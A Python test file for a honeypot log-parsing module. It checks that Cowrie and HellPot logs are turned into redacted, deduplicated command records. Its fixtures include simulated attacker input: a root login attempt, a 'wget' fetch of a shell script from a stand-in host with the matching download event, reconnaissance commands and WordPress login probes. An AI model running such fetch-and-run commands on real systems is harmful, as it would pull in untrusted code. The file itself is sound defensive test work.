from app.enrichment.command_extract import (
    command_identity,
    duplicate_group_indexes,
    extract_commands,
    is_control_plane_container,
    normalize_command,
)


def test_cowrie_json_command_redacts_password_and_keeps_input():
    raw = """
2026-04-01T12:00:01.123456789Z {"eventid":"cowrie.login.failed","username":"root","password":"hunter2","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:01.000000Z"}
2026-04-01T12:00:02.123456789Z {"eventid":"cowrie.command.input","input":"wget http://example.test/a.sh","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:02.000000Z"}
2026-04-01T12:00:03.123456789Z {"eventid":"cowrie.session.file_download","url":"http://example.test/a.sh","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:03.000000Z"}
""".strip()
    found = extract_commands(raw)
    kinds = [item.kind for item in found]
    assert kinds == ["login", "shell", "download"]
    assert found[0].command == "login failed as root"
    assert "hunter2" not in found[0].command
    assert found[1].command == "wget http://example.test/a.sh"
    assert found[1].src_ip == "203.0.113.10"
    assert found[2].kind == "download"


def test_text_cmd_and_http_request():
    raw = """
2026-04-01T12:00:04Z [HoneyPotSSHTransport,5,198.51.100.8] CMD: uname -a
2026-04-01T12:00:05Z hellpot request from 198.51.100.9 GET /wp-login.php
""".strip()
    found = extract_commands(raw)
    assert found[0].kind == "shell"
    assert found[0].command == "uname -a"
    assert found[0].src_ip == "198.51.100.8"
    assert found[1].kind == "http"
    assert found[1].command == "GET /wp-login.php"
    assert found[1].src_ip == "198.51.100.9"


def test_hellpot_json_and_key_value_requests():
    raw = """
2026-04-01T12:00:06.123456789-04:00 {"level":"info","msg":"request","method":"GET","path":"/wp-login.php?pass=secret","ip":"203.0.113.50"}
2026-04-01T12:00:07Z INFO request method=POST path=/xmlrpc.php ip=203.0.113.51
""".strip()
    found = extract_commands(raw)
    assert found[0].kind == "http"
    assert found[0].command == "GET /wp-login.php?pass=***"
    assert found[0].src_ip == "203.0.113.50"
    assert found[1].command == "POST /xmlrpc.php"
    assert found[1].src_ip == "203.0.113.51"


def test_platform_and_telemetry_requests_are_dropped():
    raw = """
2026-04-01T12:00:08Z POST /api/agent/v1/events
2026-04-01T12:00:09Z POST /bot/statistic?id=1
2026-04-01T12:00:10Z GET /wp-login.php
2026-04-01T12:00:11Z CMD: curl http://example.test/api/agent/v1/events
""".strip()
    found = extract_commands(raw)
    assert [item.command for item in found] == [
        "GET /wp-login.php",
        "curl http://example.test/api/agent/v1/events",
    ]


def test_long_shell_command_is_kept_with_surrounding_lines():
    payload = "echo " + ("A" * 2000)
    raw = "\n".join(
        [
            "2026-04-01T12:00:01Z session opened",
            f"2026-04-01T12:00:02Z CMD: {payload}",
            "2026-04-01T12:00:03Z session closed",
        ]
    )
    found = extract_commands(raw)
    assert len(found) == 1
    assert found[0].command == payload
    assert len(found[0].command) > 1024
    assert "session opened" in found[0].excerpt
    assert payload in found[0].excerpt
    assert "session closed" in found[0].excerpt


def test_control_plane_container_names():
    assert is_control_plane_container("watchpot-api-1")
    assert is_control_plane_container("watchpot-proxy")
    assert is_control_plane_container("watchpot-postgres")
    assert not is_control_plane_container("hellpot")
    assert not is_control_plane_container("cowrie")
    assert not is_control_plane_container("web-honeypot")


def test_repeat_observations_share_identity_and_sources_stay_separate():
    first = extract_commands("2026-04-01T12:00:02Z [HoneyPotSSHTransport,5,198.51.100.8] CMD: uname -a")
    later = extract_commands("2026-04-01T12:09:02Z [HoneyPotSSHTransport,9,198.51.100.8] CMD: uname -a")
    other = extract_commands("2026-04-01T12:09:02Z [HoneyPotSSHTransport,9,203.0.113.10] CMD: uname -a")
    assert command_identity(first[0].kind, first[0].command, first[0].src_ip) == command_identity(
        later[0].kind, later[0].command, later[0].src_ip
    )
    assert command_identity(first[0].kind, first[0].command, first[0].src_ip) != command_identity(
        other[0].kind, other[0].command, other[0].src_ip
    )


def test_http_paths_drop_a_trailing_slash():
    assert normalize_command("http", "GET /admin/") == "GET /admin"
    assert normalize_command("http", "GET /") == "GET /"
    assert normalize_command("http", "GET /admin/?x=1") == "GET /admin?x=1"


def test_duplicate_groups_merge_repeats_without_merging_different_commands():
    full = "echo " + ("A" * 1100)
    rows = [
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": "uname -a", "src_ip": "203.0.113.10"},
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": "uname -a", "src_ip": "203.0.113.10"},
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": "uname -a", "src_ip": "198.51.100.8"},
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": full[:1024], "src_ip": "203.0.113.9"},
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": full, "src_ip": "203.0.113.9"},
        {"pot_id": "p", "container": "hellpot", "kind": "http", "command": "GET /admin/", "src_ip": ""},
        {"pot_id": "p", "container": "hellpot", "kind": "http", "command": "GET /admin", "src_ip": ""},
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": "ls", "src_ip": "203.0.113.10"},
        {"pot_id": "p", "container": "cowrie", "kind": "shell", "command": "ls -la", "src_ip": "203.0.113.10"},
    ]
    sizes = sorted(len(group) for group in duplicate_group_indexes(rows))
    assert sizes == [1, 1, 1, 2, 2, 2]


def test_reingested_tail_has_stable_fingerprint():
    line = '2026-04-01T12:00:02.123456789Z {"eventid":"cowrie.command.input","input":"id","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:02.000000Z"}'
    first = extract_commands(line)
    second = extract_commands(line + "\n" + line)
    assert len(first) == 1
    assert len(second) == 1
    assert first[0].fingerprint == second[0].fingerprint
